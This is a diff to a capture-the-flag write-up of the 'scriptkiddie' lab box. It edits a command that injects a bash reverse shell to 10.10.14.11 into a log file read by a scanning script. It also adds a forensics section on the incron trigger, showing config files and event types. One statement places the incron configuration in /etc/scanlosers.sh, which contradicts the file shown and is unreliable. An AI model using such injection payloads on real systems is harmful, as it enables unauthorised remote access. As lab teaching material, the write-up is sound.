@@ -135,7 +135,7 @@ Now, as we can see the application is executing `nmap` against the ip found in t
 As we can notice, the cut function uses as argument `-f3-` which basically means cut from the third item till the end of the line.  
 Now, since we can write the log file, because we are the owners, we can inject the following payload int the log file:  
 ```bash
-kid@scriptkiddie:~/logs$ echo "[2022-06-06 09:08:18.512966] 10.10.14.11; bash -c 'bash -i >& /dev/tcp/10.10.14.11/9002 0>&1'; #"
+kid@scriptkiddie:~/logs$ echo "[2022-06-06 09:08:18.512966] 10.10.14.11; bash -c 'bash -i >& /dev/tcp/10.10.14.11/9002 0>&1'; #" > hackers
 ```
 and as we can notice, we get a shell as user `pwn`
 ```
@@ -189,3 +189,107 @@ root@scriptkiddie:/home/pwn# whoami
 root
 ```
 And we gained a shell as root
+
+## Forensics
+After we gained root access let's dig deeper into ```incrond``` to see how the `scanlosers.sh` execution is triggered.  
+If we go to the manual we can see that all the configurations are defined into `/etc/scanlosers.sh` file.  
+As we open the file we can see that everything is pretty standard:  
+```bash
+#
+# *** incron example configuration file ***
+#
+# (c) Lukas Jelinek, 2007, 2008
+#
+
+
+# Parameter:   system_table_dir
+# Meaning:     system table directory
+# Description: This directory is examined by incrond for system table files.
+# Default:     /etc/incron.d
+#
+# Example:
+# system_table_dir = /var/spool/incron.systables
+
+
+# Parameter:   user_table_dir
+# Meaning:     user table directory
+# Description: This directory is examined by incrond for user table files.
+# Default:     /var/spool/incron
+#
+# Example:
+# user_table_dir = /var/spool/incron.usertables
+
+
+# Parameter:   allowed_users
+# Meaning:     allowed users list file
+# Description: This file contains users allowed to use incron.
+# Default:     /etc/incron.allow
+#
+# Example:
+# allowed_users = /etc/incron/allow
+
+
+# Parameter:   denied_users
+# Meaning:     denied users list file
+# Description: This file contains users denied to use incron.
+# Default:     /etc/incron.deny
+#
+# Example:
+# denied_users = /etc/incron/deny
+
+
+# Parameter:   lockfile_dir
+# Meaning:     application lock file directory
+# Description: This directory is used for creating a lock avoiding to run
+#              multiple instances of incrond.
+# Default:     /var/run
+#
+# Example:
+# lockfile_dir = /tmp
+
+
+# Parameter:   lockfile_name
+# Meaning:     application lock file name base
+# Description: This name (appended by '.pid') is used for creating a lock
+#              avoiding to run multiple instances of incrond.
+# Default:     incrond
+#
+# Example:
+# lockfile_name = incron.lock
+
+
+# Parameter:   editor
+# Meaning:     editor executable
+# Description: This name or path is used to run as an editor for editing
+#              user tables.
+# Default:     vim
+#
+# Example:
+# editor = nano
+```
+Under `/etc/incron.allow` we can see the users allowed to execute process with incron:  
+```
+root@scriptkiddie:/var/spool# cat /etc/incron.allow 
+pwn
+```
+And, under `/var/spool/incron` we can see configuration files that triggers command based on file system events:  
+```bash
+root@scriptkiddie:/var/spool/incron# cat pwn 
+/home/pwn/recon/        IN_CLOSE_WRITE  sed -i 's/open  /closed/g' "$@$#"
+/home/kid/logs/hackers  IN_CLOSE_WRITE   /home/pwn/scanlosers.sh
+```
+On the first column we can see the monitored file, then, the event symbol and finally the command to be executed when an event is catched.  
+According to online documentation these are the available event symbols:  
+* **IN_ACCESS** File was accessed (read) 
+* **IN_ATTRIB** Metadata changed (permissions, timestamps, extended attributes, etc.)
+* **IN_CLOSE_WRITE** File opened for writing was closed 
+* **IN_CLOSE_NOWRITE** File not opened for writing was closed 
+* **IN_CREATE** File/directory created in watched directory 
+* **IN_DELETE** File/directory deleted from watched directory
+* **IN_DELETE_SELF** Watched file/directory was itself deleted  
+* **IN_MODIFY** File was modified
+* **IN_MOVE_SELF** Watched file/directory was itself moved  
+* **IN_MOVED_FROM** File moved out of watched directory 
+* **IN_MOVED_TO** File moved into watched directory
+* **IN_OPEN** File was opened
+In this case, we can see that IN_CLOSE_WRITE means trigger the execution after the watched file opened for writing has been closed (by the python process). 
